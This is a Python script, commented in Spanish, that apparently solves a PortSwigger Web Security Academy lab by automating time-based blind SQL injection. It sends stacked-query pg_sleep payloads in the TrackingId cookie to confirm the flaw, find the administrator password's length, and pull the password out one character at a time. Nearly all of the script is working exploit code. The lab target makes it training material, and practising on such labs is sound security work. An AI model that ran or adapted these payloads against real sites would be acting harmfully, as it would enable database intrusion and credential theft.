import requests
import string
import time

# ============================================================
# CONFIGURACIÓN — editá estos valores antes de correr
# ============================================================
URL           = "https://TU-LAB-ID.web-security-academy.net/"
COOKIE_NAME   = "TrackingId"
COOKIE_STATIC = "TU-SESSION-COOKIE"
TRACKING_ID   = "TU-TRACKING-ID"
DELAY         = 5    # segundos de delay para condición true
THRESHOLD     = 4    # segundos mínimos para considerar true
PASSWORD_LEN  = 20   # fallback si no detecta el largo
# ============================================================

CHARS = string.ascii_lowercase + string.digits  # a-z + 0-9

def check(payload):
    """Devuelve True si la respuesta tardó más de THRESHOLD segundos."""
    cookies = {
        COOKIE_NAME: TRACKING_ID + payload,
        "Session": COOKIE_STATIC
    }
    start = time.time()
    requests.get(URL, cookies=cookies)
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_password_length():
    print("[*] Determinando largo de la contraseña...")
    for i in range(1, 50):
        payload = (
            f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)={i})"
            f"+THEN+pg_sleep({DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
        )
        if check(payload):
            print(f"[+] Largo de la contraseña: {i}")
            return i
    return PASSWORD_LEN

def extract_password(length):
    print(f"[*] Extrayendo contraseña ({length} caracteres)...")
    password = ""
    for pos in range(1, length + 1):
        for char in CHARS:
            payload = (
                f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')"
                f"+THEN+pg_sleep({DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
            )
            if check(payload):
                password += char
                print(f"[+] Posición {pos:02d}: {char}  →  {password}")
                break
        else:
            password += "?"
            print(f"[-] Posición {pos:02d}: no encontrado")
    return password

if __name__ == "__main__":
    print("[*] Verificando inyección (esperamos delay de ~5s)...")
    test = f"'%3BSELECT+pg_sleep({DELAY})--"
    if not check(test):
        print("[-] No se detectó el delay. Revisá la URL y las cookies.")
        exit(1)
    print("[+] Inyección confirmada\n")

    length = get_password_length()
    password = extract_password(length)

    print(f"\n[✓] Contraseña: {password}")
